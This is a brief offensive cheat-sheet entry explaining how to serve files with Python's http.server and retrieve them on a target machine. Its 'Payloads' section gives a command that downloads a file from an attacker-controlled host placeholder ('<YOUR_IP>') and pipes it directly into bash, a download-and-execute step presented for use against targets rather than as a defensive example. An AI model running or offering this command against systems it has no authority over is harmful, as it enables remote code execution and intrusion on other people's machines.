## What is it  

A method using Python to quickly host files and retrieve them on the target machine.

---

## Payloads  

```bash
python3 -m http.server 8000
curl http://<YOUR_IP>:8000/anyfile.ext | bash
```
